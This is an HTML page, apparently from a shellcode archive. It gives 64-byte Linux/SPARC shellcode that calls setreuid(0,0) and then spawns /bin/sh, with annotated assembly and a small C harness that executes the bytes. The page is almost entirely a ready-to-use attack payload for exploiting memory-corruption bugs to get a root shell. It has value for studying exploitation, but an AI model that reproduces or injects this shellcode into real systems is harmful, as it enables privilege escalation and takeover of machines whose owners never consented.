<html><head><title>Linux/sparc - [setreuid(0,0); execve() of /bin/sh]  - 64 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 *  Linux/SPARC [setreuid(0,0); execve() of /bin/sh] shellcode.
 */  

char c0de[] = /* anathema &lt; anathema@hack.co.za &gt; */
/* setreuid(0,0); */
&quot;\x82\x10\x20\x7e&quot;   /* mov 126, %g1               */
&quot;\x92\x22\x40\x09&quot;   /* sub %o1, %o1, %o1          */
&quot;\x90\x0a\x40\x09&quot;   /* and %o1, %o1, %o0          */
&quot;\x91\xd0\x20\x10&quot;   /* ta 0x10                    */

/* execve() of /bin/sh */
&quot;\x2d\x0b\xd8\x9a&quot;   /* sethi %hi(0x2f626800), %l6 */
&quot;\xac\x15\xa1\x6e&quot;   /* or %l6, 0x16e, %l6         */
&quot;\x2f\x0b\xdc\xda&quot;   /* sethi %hi(0x2f736800), %l7 */
&quot;\x90\x0b\x80\x0e&quot;   /* and %sp, %sp, %o0          */
&quot;\x92\x03\xa0\x08&quot;   /* add %sp, 0x08, %o1         */
&quot;\x94\x22\x80\x0a&quot;   /* sub %o2, %o2, %o2          */
&quot;\x9c\x03\xa0\x10&quot;   /* add %sp, 0x10, %sp         */
&quot;\xec\x3b\xbf\xf0&quot;   /* std %l6, [ %sp + - 16 ]    */
&quot;\xd0\x23\xbf\xf8&quot;   /* st %o0, [ %sp + - 8 ]      */
&quot;\xc0\x23\xbf\xfc&quot;   /* clr [ %sp + -4 ]           */
&quot;\x82\x10\x20\x3b&quot;   /* mov 0x3b, %g1              */
&quot;\x91\xd0\x20\x10&quot;   /* ta 0x10                    */
;

/*
 *  Test out the shellcode.
 */ 
main ()
{
    void (*sc)() = (void *)c0de;
    sc();
}

/* EOF */



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
